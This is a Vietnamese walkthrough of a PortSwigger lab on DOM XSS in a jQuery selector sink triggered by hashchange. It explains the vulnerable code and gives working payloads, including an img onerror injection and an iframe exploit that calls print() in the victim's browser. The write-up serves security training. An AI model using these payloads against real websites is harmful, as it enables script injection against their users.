<img width="1529" height="601" alt="image" src="https://github.com/user-attachments/assets/bff45cd4-c350-4d59-95f5-9b16bb4be7f3" />

Yêu cầu: Gửi exploit cho nạn nhân để gọi hàm print().

Gợi ý: Lỗ hổng DOM XSS nằm ở trang chủ. Trang dùng hàm $() của jQuery để tự động cuộn bài viết dựa trên dữ liệu lấy từ location.hash (phần sau dấu # ở URL). Hãy thao túng location.hash này.

<img width="2493" height="1443" alt="image" src="https://github.com/user-attachments/assets/ea3ae007-f74d-4cb1-acc9-c92719e5a951" />

Trên là trang chủ của bài lab. Phía dưới là source code

```javascript
<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>DOM XSS in jQuery selector sink using a hashchange event</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>DOM XSS in jQuery selector sink using a hashchange event</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a2e000e031c8be18031de85010500c4.exploit-server.net'>Go to exploit server</a>
                            <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/40.jpg"></a>
                        <h2>The Cool Parent</h2>
                        <p>Trying to be the cool parent was never going to be easy. How could I be a cool grown up when I wasn't even a cool kid? With only sons, I thought it would be easy, especially the older they...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/46.jpg"></a>
                        <h2>Stag Do's</h2>
                        <p>Whenever a friend or relative announces their engagement, there is always one burning question that isn't really asked straight away out of politeness for the bride to be. While you're stood their feigning interest and enthusiasm for yet another wedding...</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/68.jpg"></a>
                        <h2>Wedding Bells</h2>
                        <p>There's a new craze that is crazier than the craziest crazes so far - in my opinion. This is the one where a couple fall in love, get engaged, then invite their family and friends to pay for the wedding....</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/66.jpg"></a>
                        <h2>Machine Parenting</h2>
                        <p>It has finally happened. The progression from using TV's and tablets as a babysitter for your kids has evolved. Meet the droids, the 21st Century Machine Parenting bots who look just like mom and dad.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/5.jpg"></a>
                        <h2>Do You Speak English?</h2>
                        <p>It mega hurts me to admit this, but sometimes I have no idea what people are talking about. The language of youth and the language of the technical world leaves me completely stumped. Young people talk in abbreviations and use...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                    </section>
                    <script src="/resources/js/jquery_1-8-2.js"></script>
                    <script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
                    <script>
                        $(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

Thì ta sẽ tập trung vào phần script có hàm selector.

```javascript
                        $(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
```

Thì hàm trên đang dùng hàm selector tới đối tượng `window` đại diện cho toàn bộ tab hiện tại và nó sử dụng hàm `on` để lắng nghe khi nào xảy ra `hashchang`(khi phần chuỗi bắt đầu `#`  trở về sau 
thay đổi) thì sẽ thực hiện cái `function()` được khởi tạo phía sau.

Bên trong function(), biến post được khởi tạo để lưu trữ kết quả tìm kiếm thẻ HTML. Lệnh selector sẽ đi tìm các thẻ h2 (nằm trong thẻ <section> có class là blog-list) mà nội dung bên trong thẻ đó có 
chứa chuỗi từ khóa. Chuỗi từ khóa này chính là giá trị đuôi của URL sau khi đã cắt bỏ dấu # (qua slice(1)) và được giải mã (qua decodeURIComponent)

Sau khi chạy lệnh tìm kiếm, nếu biến post thực sự tồn tại (tức là tìm thấy thẻ <h2> của bài viết tương ứng), đoạn mã sẽ sử dụng hàm .get(0) để trích xuất phần tử HTML (DOM thuần) đầu tiên từ danh 
sách kết quả. Cuối cùng, nó gọi hàm scrollIntoView() để yêu cầu trình duyệt tự động cuộn màn hình xuống đúng vị trí hiển thị của thẻ đó.

Như chúng ta đã phân tích, hàm selector $() ở các phiên bản jQuery cũ (trước 1.9.0) tồn tại một cơ chế nguy hiểm: nó sẽ tự động khởi tạo phần tử HTML nếu phát hiện chuỗi đầu vào có chứa cấu trúc thẻ.

Để chứng minh điều này, chúng ta có thể truyền vào một thẻ thụ động như <h1>. Mặc dù thẻ <h1> sẽ được jQuery nặn ra thành công, nhưng nó không được chèn vào giao diện DOM chính nên sẽ không hiển thị 
trên màn hình, mà chỉ tồn tại lơ lửng trong bộ nhớ (Disconnected DOM Node). Ta hoàn toàn có thể sử dụng tab Console trong DevTools để gọi lại biến lưu trữ và kiểm chứng sự tồn tại của thẻ HTML này.

```javascript
var testBypass = $('section.blog-list h2:contains(<h1>Hack_Thanh_Cong</h1>)');
console.log(testBypass);
```

<img width="2497" height="281" alt="image" src="https://github.com/user-attachments/assets/dc2d4f83-54dd-48c3-a959-164320824142" />

Có thể thấy ta đã thành công tạo 1 thẻ h1.

Vậy sẽ ra sao nếu ta chèn thẻ có khả năng tự động thực thi (active tag) như `img` thì khi trình duyệt tự động phân tích thuộc tính src và gửi request (yêu cầu mạng) để tải tài nguyên(không được chèn 
vào DOM (giao diện)) thì điều này giúp ta có thể thực thi được 1 đoạn javascript khi kết hợp với 1 event handler trong này do ảnh không được hiển thị ra ngoài ta sẽ dùng event handler nào mà không 
yêu cầu tương tác từ người dùng mà vãn thực thi javascript, ví dụ ở đây tôi sẽ dùng `onerror` rồi truyền 1 đường dẫn không hợp lệ vào ảnh gây lỗi và tự động thực thi.

Payload:
```javascript
#<img src=x onerror="alert(1)">
```

<img width="2501" height="1443" alt="image" src="https://github.com/user-attachments/assets/e7d83569-7b97-4664-a145-d6dc8336fd9d" />

Có thể thấy ta đã thành công bật được alert. Tiếp đến là khai thác ở bên victim. Bài lab có cung cấp 1 trang web để tự động gửi tới victim ở đây là con bot có khả năng truy cập vào link.

<img width="2501" height="1443" alt="image" src="https://github.com/user-attachments/assets/66ff0292-f142-4873-95bd-b91a31cf57f3" />

Ở đây ta sẽ tự tạo 1 trang bằng HTML thì để gọi được hàm `print()` ở máy victim thì để kích hoạt lỗi, trình duyệt của nạn nhân buộc phải tải trang lab mục tiêu thì ở đây tôi sử dụng thẻ <iframe> để 
nhúng (embed) âm thầm trang lab vào trang exploit của chúng ta.

```javascript
<iframe src="https://0a6d002203b6ec8480a95d84009b007f.web-security-academy.net/">
```

Tiếp đến là payload để nó tự động gọi hàm `print()` thì ở đây do ta không thể đảm bảo phía victim sẽ tương tác gì với phía trang lab thì ta cũng sẽ dùng event handler nào mà không yêu cầu tương tác 
từ người dùng thì `iframe` có 1 event handler cho việc này đó là `onload` nó sẽ được thực thi ngay khi trang web mà iframe gọi tới load xong thì trong onload ta sẽ nối chuỗi URL tới payload phía 
trên ta đã test

```javascript
<iframe src="https://0a6d002203b6ec8480a95d84009b007f.web-security-academy.net/" onload="this.src+='#<img src=x onerror=print()>'">
```

<img width="2492" height="1443" alt="image" src="https://github.com/user-attachments/assets/c9b88aa2-dbd0-4a1e-828d-4e4800018322" />
